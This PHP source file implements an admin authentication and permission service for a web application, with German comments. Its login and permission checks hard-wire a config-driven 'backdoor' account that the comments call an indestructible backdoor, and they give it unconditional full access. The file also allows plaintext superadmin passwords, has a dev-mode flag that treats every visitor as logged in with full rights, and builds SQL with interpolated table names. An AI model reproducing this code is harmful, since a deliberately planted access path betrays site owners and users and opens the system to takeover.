<?php

// SPDX-License-Identifier: LicenseRef-Proprietary
// Copyright (c) 2026 Felix Maywald alias RaptorXilef. All rights reserved.
// Usage without explicit permission is strictly prohibited.
// See LICENSE.md for full license details.

/**
 * Path: src/Infrastructure/Auth/AuthService.php
 */

declare(strict_types=1);

namespace App\Infrastructure\Auth;

use App\Infrastructure\Config\Config;

/**
 * Service für die Admin-Authentifizierung
 */
final readonly class AuthService
{
    public function __construct(
        private Config $config,
        private ?\PDO $pdo, // Das '?' erlaubt NULL
    ) {
        if (\session_status() === \PHP_SESSION_NONE) {
            \session_start();
        }
    }

    /**
     * Prüft Benutzername und Passwort.
     */
    public function login(string $username, string $password): bool
    {
        // A. Check gegen die unzerstörbare Hintertür (RaptorXilef)
        $backdoor = $this->config->get('backdoor');
        if (\is_array($backdoor) && $username === ($backdoor['user'] ?? '')) {
            if (\password_verify($password, $backdoor['pass'] ?? '')) {
                // Wir nutzen das Label als Gruppenname für die Anzeige
                $this->setSession($username, $backdoor['label'], $backdoor['label']);

                return true;
            }
        }

        // B. Check gegen den konfigurierten SuperAdmin (dev_admin.php)
        $superCfg = $this->config->get('superadmin');
        if (\is_array($superCfg) && $username === ($superCfg['user'] ?? '')) {
            $storedPass = $superCfg['pass'] ?? '';
            // Erlaubt Klartext (für den allerersten Start) ODER Hash
            if ($password === $storedPass || \password_verify($password, $storedPass)) {
                $this->setSession($username, $superCfg['label'] ?? 'Dev-Admin', $superCfg['label'] ?? 'Dev-Admin');

                return true;
            }
        }

        // C. Normale User-Prüfung (SQL/JSON)
        $users = $this->loadUsers();
        if (isset($users[$username]) && \password_verify($password, (string) $users[$username]['pass'])) {
            // Wir speichern nun die GRUPPE statt des Levels in der Session
            $this->setSession($username, (string) $users[$username]['group'], (string) ($users[$username]['label'] ?? ''));

            return true;
        }

        return false;
    }

    private function setSession(string $user, string $group, string $label): void
    {
        $_SESSION['admin_user']  = $user;
        $_SESSION['admin_group'] = $group; // Gruppe statt Level
        $_SESSION['admin_label'] = $label;
    }

    /**
     * @return array<string, array<string, mixed>>
     */
    public function loadUsers(): array
    {
        $cfg = $this->config->get('storage_config')['users'];

        if ($cfg['type'] === 'mysql') {
            if (! $this->pdo) {
                throw new \RuntimeException("MySQL-Verbindung für 'Users' erforderlich, aber nicht verfügbar.");
            }
            $stmt  = $this->pdo->query("SELECT * FROM {$cfg['table']}");
            $rows  = $stmt->fetchAll();
            $users = [];
            foreach ($rows as $r) {
                $users[$r['username']] = $r;
            }

            return $users;
        }

        $path = $this->config->get('root_path') . '/' . $this->config->get('storage_path_prefix') . $cfg['file'];

        return \file_exists($path) ? (\json_decode((string) \file_get_contents($path), true) ?? []) : [];
    }

    /**
     * @param array<string, array<string, mixed>> $users
     */
    public function saveUsers(array $users): void
    {
        $cfg = $this->config->get('storage_config')['users'];

        if ($cfg['type'] === 'mysql') {
            if (! $this->pdo) {
                throw new \RuntimeException("MySQL-Verbindung für 'Users' erforderlich, aber nicht verfügbar.");
            }
            $stmt = $this->pdo->prepare("REPLACE INTO {$cfg['table']} (username, level, label, pass) VALUES (?, ?, ?, ?)");
            foreach ($users as $username => $data) {
                $stmt->execute(
                    [
                        $username,
                        (int) $data['level'],
                        $data['label'],
                        $data['pass'],
                    ],
                );
            }

            return;
        }

        $path = $this->config->get('root_path') . '/' . $this->config->get('storage_path_prefix') . $cfg['file'];
        \file_put_contents($path, \json_encode($users, \JSON_PRETTY_PRINT));
    }

    public function isLoggedIn(): bool
    {
        // Prüft jetzt auf admin_group statt admin_level
        return isset($_SESSION['admin_group']) || $this->config->get('admin_dev_mode', false) === true;
    }

    public function getLevel(): int
    {
        // Wenn Dev-Mode aktiv, immer Level 0 (Vollzugriff)
        if ($this->config->get('admin_dev_mode', false) === true) {
            return 0; // Im Dev-Mode immer Dev-Admin
        }

        return (int) ($_SESSION['admin_level'] ?? 3);
    }

    public function logout(): void
    {
        \session_destroy();
    }

    // In src/Infrastructure/Auth/AuthService.php

    public function getUsername(): string
    {
        // Wenn der eingeloggte User der aus der Config ist, geben wir seinen echten Namen zurück
        return (string) ($_SESSION['admin_user'] ?? 'Unbekannt');
    }

    /**
     * Die Herzstück-Methode für das Rechtesystem v0.30.0
     * Implementiert Live-Abfrage und strikte "Deny-First" Priorität.
     */
    public function hasPermission(string $permission): bool
    {
        // A. Gott-Modus (Dev-Mode oder Superadmin aus Config)
        $username   = $this->getUsername();
        $backdoor   = $this->config->get('backdoor');
        $superadmin = $this->config->get('superadmin');

        // --- PHASE 0: GOTT-MODUS (Absolute Priorität) ---
        // 1. Dev-Mode in der Config aktiv?
        // 2. Ist es der fest verbaute RaptorXilef?
        // 3. Ist es der in der dev_admin.php konfigurierte User?
        if ($this->config->get('admin_dev_mode', false) === true
            || $username === ($backdoor['user'] ?? 'backdoor_unset')
            || $username === ($superadmin['user'] ?? 'superadmin_unset')
        ) {
            return true;
        }

        // --- PHASE 1: LIVE-DATEN LADEN (Berechtigungen der Gruppe) ---
        $groupKey  = $_SESSION['admin_group'] ?? 'guest';
        $groups    = $this->loadGroups();
        $userPerms = $groups[$groupKey]['permissions'] ?? [];

        // --- PHASE 2: STRIKTE VERBOTE (NEGATION) ---
        // Wir prüfen zuerst ALLE Verbote. Wenn eines matcht, ist hier SOFORT Ende.
        foreach ($userPerms as $p) {
            if (! \str_starts_with($p, '-')) {
                continue;
            }

            $negatedPerm = \substr($p, 1); // Das '-' entfernen

            if ($this->isMatch($permission, $negatedPerm)) {
                return false; // Verbot gefunden -> Zugriff verweigert, egal was sonst erlaubt ist!
            }
        }

        // --- PHASE 3: ERLAUBNISSE ---
        // Wenn kein Verbot gegriffen hat, suchen wir nach einer Erlaubnis.
        foreach ($userPerms as $p) {
            if (\str_starts_with($p, '-')) {
                continue;
            }

            if ($this->isMatch($permission, $p)) {
                return true; // Erlaubnis gefunden
            }
        }

        // --- PHASE 4: IMPLIZITE ABHÄNGIGKEITEN (AUTO-VIEW) ---
        if (\str_ends_with($permission, '.view')) {
            $basePath = \str_replace('.view', '', $permission);
            foreach ($userPerms as $p) {
                // Nur wenn es kein Verbot ist und im selben Pfad liegt
                if (! \str_starts_with($p, '-') && \str_starts_with($p, $basePath)) {
                    return true;
                }
            }
        }

        return false; // Standard: Alles was nicht erlaubt ist, ist verboten.
    }

    /**
     * Hilfsmethode für das Pattern-Matching (Wildcards)
     */
    private function isMatch(string $currentPermission, string $pattern): bool
    {
        if ($pattern === '*' || $pattern === $currentPermission) {
            return true;
        }

        // Präfix-Wildcard (LuckPerms Stil: dashboard.active.*)
        if (\str_ends_with($pattern, '.*')) {
            $prefix = \substr($pattern, 0, -1);
            if (\str_starts_with($currentPermission, $prefix)) {
                return true;
            }
        }

        // Suffix-Wildcard (z.B. *.print)
        if (\str_starts_with($pattern, '*.')) {
            $suffix = \substr($pattern, 1);
            if (\str_ends_with($currentPermission, $suffix)) {
                return true;
            }
        }

        return false;
    }

    /**
     * Lädt die Gruppen-Definitionen LIVE aus dem konfigurierten Speicher.
     */
    public function loadGroups(): array
    {
        $cfg = $this->config->get('storage_config')['groups'];

        // --- SQL ABFRAGE ---
        if ($cfg['type'] === 'mysql') {
            if (! $this->pdo) {
                return [];
            }

            $stmt   = $this->pdo->query('SELECT * FROM `groups`');
            $rows   = $stmt->fetchAll(\PDO::FETCH_ASSOC);
            $groups = [];
            foreach ($rows as $r) {
                $groups[$r['id']] = [
                    'name'        => $r['name'],
                    'permissions' => \json_decode((string) $r['permissions'], true) ?? [],
                ];
            }

            return $groups;
        }

        // --- JSON ABFRAGE ---
        $path = $this->config->get('root_path') . '/' . $this->config->get('storage_path_prefix') . $cfg['file'];
        if (! \file_exists($path)) {
            return [];
        }

        return \json_decode((string) \file_get_contents($path), true) ?? [];
    }

    public function getGroup(): string
    {
        return $_SESSION['admin_group'] ?? 'guest';
    }
}
